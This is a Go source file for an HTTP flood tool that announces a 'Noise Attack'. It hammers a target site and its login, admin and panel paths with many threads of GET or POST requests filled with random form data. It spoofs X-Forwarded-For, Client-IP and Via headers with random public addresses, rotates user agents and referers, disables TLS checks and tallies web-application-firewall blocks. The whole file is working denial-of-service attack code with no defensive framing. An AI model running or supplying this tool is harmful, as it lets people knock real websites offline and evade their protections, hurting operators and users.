// noise1_fixed_v3.go
package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var (
	PROXIES        []string
	CUSTOM_HEADERS map[string]string
	HIT_CODES      = map[int]bool{200: true, 401: true, 403: true}
	WAF_HINTS      = []string{"cloudflare", "access denied", "akamai", "imperva", "sucuri", "mod_security", "forbidden"}
	CORE_PATHS     = []string{"index.php", "index.html", "login", "admin", "dashboard", "panel"}
	headersUA      = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/118.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) Firefox/118.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) Safari/605.1.15",
	}
	headersRef = []string{"https://google.com?q=", "https://bing.com/search?q="}
)

func atoi(s string) int { v, _ := strconv.Atoi(s); return v }

func randomPublicIP() string {
	for {
		a, b, c, d := rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256)
		if a == 10 || a == 127 || (a == 192 && b == 168) || (a == 172 && b >= 16 && b <= 31) || a == 0 || a == 255 {
			continue
		}
		return fmt.Sprintf("%d.%d.%d.%d", a, b, c, d)
	}
}

func randomIPChain() string {
	if rand.Intn(100) < 60 {
		return randomPublicIP()
	}
	return fmt.Sprintf("%s, %s", randomPublicIP(), randomPublicIP())
}

func buildblock(n int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890")
	out := make([]rune, n)
	for i := range out {
		out[i] = letters[rand.Intn(len(letters))]
	}
	return string(out)
}

func detectFormKeys(u string) []string {
	keys := []string{"input"}
	client := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}, Timeout: 5 * time.Second}
	resp, err := client.Get(u)
	if err != nil {
		return keys
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	re := regexp.MustCompile(`(?i)<input.*?name=["'](.*?)["']`)
	matches := re.FindAllStringSubmatch(string(body), -1)
	for _, m := range matches {
		if len(m) > 1 {
			keys = append(keys, m[1])
		}
	}
	return keys
}

func detectWAF(resp *http.Response, body string) string {
	b := strings.ToLower(body)
	for _, w := range WAF_HINTS {
		if strings.Contains(b, w) {
			return w
		}
	}
	if resp.StatusCode == 403 {
		return "403"
	}
	return ""
}

func nextProxy() string {
	if len(PROXIES) == 0 {
		return ""
	}
	return PROXIES[rand.Intn(len(PROXIES))]
}

func sendRequest(client *http.Client, target, method string, s chan uint8) {
	keys := detectFormKeys(target)
	postData := ""
	for _, k := range keys {
		postData += fmt.Sprintf("%s=%s&", k, buildblock(5))
	}
	postData = strings.TrimSuffix(postData, "&")

	var req *http.Request
	var err error
	if method == "GET" {
		sep := "?"
		if strings.Contains(target, "?") {
			sep = "&"
		}
		req, err = http.NewRequest("GET", target+sep+postData, nil)
	} else {
		req, err = http.NewRequest("POST", target, strings.NewReader(postData))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	if err != nil {
		return
	}

	req.Header.Set("User-Agent", headersUA[rand.Intn(len(headersUA))])
	req.Header.Set("Referer", headersRef[rand.Intn(len(headersRef))]+buildblock(6))
	req.Header.Set("X-Forwarded-For", randomIPChain())
	req.Header.Set("Client-IP", randomPublicIP())
	req.Header.Set("Via", randomPublicIP())
	req.Header.Set("Accept", "text/html,application/xhtml+xml")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Connection", "keep-alive")

	for k, v := range CUSTOM_HEADERS {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		s <- 1
		return
	}
	body, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	if detectWAF(resp, string(body)) != "" {
		s <- 2
		return
	}
	s <- 0
}

func worker(urlList []string, method string, stopTime time.Time, stopFlag *int32, s chan uint8, port string, wg *sync.WaitGroup) {
	defer wg.Done()
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client := &http.Client{Transport: tr, Timeout: 10 * time.Second}

	for atomic.LoadInt32(stopFlag) == 0 && time.Now().Before(stopTime) {
		target := urlList[rand.Intn(len(urlList))]
		if !strings.Contains(target, ":"+port) {
			target = strings.TrimSuffix(target, "/") + ":" + port
		}
		sendRequest(client, target, method, s)
		time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())

	if len(os.Args) < 8 {
		fmt.Printf("Usage: %s <target-url> <threads> <method(GET/POST)> <duration-sec> <proxyfile|nil> <headerfile|nil> <port>\n", os.Args[0])
		os.Exit(1)
	}

	target := os.Args[1]
	threads := atoi(os.Args[2])
	method := strings.ToUpper(os.Args[3])
	duration := atoi(os.Args[4])
	proxyFile := os.Args[5]
	headerFile := os.Args[6]
	port := os.Args[7]

	if proxyFile != "nil" {
		if data, err := ioutil.ReadFile(proxyFile); err == nil {
			for _, l := range strings.Split(string(data), "\n") {
				l = strings.TrimSpace(l)
				if l != "" {
					PROXIES = append(PROXIES, l)
				}
			}
		}
	}

	if headerFile != "nil" {
		CUSTOM_HEADERS = make(map[string]string)
		if data, err := ioutil.ReadFile(headerFile); err == nil {
			for _, l := range strings.Split(string(data), "\n") {
				l = strings.TrimSpace(l)
				if l == "" || strings.HasPrefix(l, "#") {
					continue
				}
				p := strings.SplitN(l, ":", 2)
				if len(p) == 2 {
					CUSTOM_HEADERS[strings.TrimSpace(p[0])] = strings.TrimSpace(p[1])
				}
			}
		}
	}

	stopTime := time.Now().Add(time.Duration(duration) * time.Second)
	urlList := []string{target}
	for _, path := range CORE_PATHS {
		urlList = append(urlList, strings.TrimRight(target, "/")+"/"+path)
	}

	fmt.Println("\n*------ Noise Attack Started------*")
	fmt.Printf("Target: %s  |  Port: %s  |  Threads: %d  |  Duration: %ds\n\n", target, port, threads, duration)

	ss := make(chan uint8, threads*3)
	var stopFlag int32
	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go worker(urlList, method, stopTime, &stopFlag, ss, port, &wg)
	}

	go func() {
		var sent, errs, waf int
		for status := range ss {
			switch status {
			case 0:
				sent++
			case 1:
				errs++
			case 2:
				waf++
			}
			fmt.Printf("\rSent: %d | Errors: %d | WAF Hits: %d", sent, errs, waf)
		}
	}()

	ctlc := make(chan os.Signal, 1)
	signal.Notify(ctlc, os.Interrupt)

	select {
	case <-ctlc:
	case <-time.After(time.Duration(duration) * time.Second):
	}

	atomic.StoreInt32(&stopFlag, 1)
	wg.Wait()
	close(ss)
	fmt.Println("\n\n-- Finished --")
}
